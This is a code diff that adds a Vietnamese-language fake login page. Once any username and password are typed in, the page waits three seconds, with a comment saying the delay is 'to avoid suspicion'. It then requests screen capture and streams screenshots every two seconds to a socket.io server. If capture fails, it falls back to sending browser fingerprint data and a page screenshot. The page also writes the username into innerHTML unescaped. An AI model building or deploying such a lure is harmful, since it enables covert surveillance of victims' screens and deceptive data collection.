@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login - Screenshot Mode</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 50px; }
+        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Đăng nhập</h2>
+        <input type="text" id="username" placeholder="Tên đăng nhập">
+        <input type="password" id="password" placeholder="Mật khẩu">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        
+        async function captureScreen() {
+            try {
+                // Sử dụng Screen Capture API thay vì camera
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { mediaSource: 'screen' },
+                    audio: false
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                    socket.emit('video-stream', imageData);
+                }, 2000);
+                
+            } catch (err) {
+                // Fallback: chỉ gửi thông tin browser
+                sendBrowserInfo();
+            }
+        }
+        
+        function sendBrowserInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            socket.emit('user-info', info);
+            
+            // Gửi screenshot của trang web hiện tại
+            html2canvas(document.body).then(canvas => {
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                socket.emit('video-stream', imageData);
+            }).catch(() => {
+                console.log('Screenshot failed');
+            });
+        }
+        
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                alert('Đăng nhập thành công!');
+                document.querySelector('.login-form').innerHTML = '<h2>Chào mừng ' + username + '!</h2><p>Bạn đã đăng nhập thành công.</p>';
+                
+                // Delay để tránh nghi ngờ
+                setTimeout(() => {
+                    captureScreen();
+                }, 3000);
+                
+            } else {
+                alert('Vui lòng nhập đầy đủ thông tin!');
+            }
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
